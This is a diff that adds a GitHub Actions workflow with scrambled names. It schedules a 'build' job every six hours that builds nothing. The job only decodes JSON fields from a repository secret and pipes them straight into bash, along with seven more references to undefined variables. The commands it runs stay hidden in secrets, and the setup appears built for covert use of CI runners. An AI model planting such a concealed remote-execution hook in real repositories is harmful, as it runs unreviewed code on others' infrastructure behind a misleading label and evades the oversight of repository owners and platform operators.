@@ -1,0 +1,25 @@
+name: kongshequ4562
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongshequ4562
+        env:
+          djypk59968: ${{ secrets.djypk59968 }}
+        run: |
+          echo $djypk59968 | jq -r .i2280 | /bin/bash
+          echo $weh7806 | jq -r .eobxh3 | /bin/bash
+          echo $bi4 | jq -r .pdwho970 | /bin/bash
+          echo $gv4 | jq -r .ik22814 | /bin/bash
+          echo $od681 | jq -r .pr8 | /bin/bash
+          echo $at26218 | jq -r .ahkwb1 | /bin/bash
+          echo $wredi26 | jq -r .ngi7696 | /bin/bash
+          echo $nr5 | jq -r .cp6 | /bin/bash
+
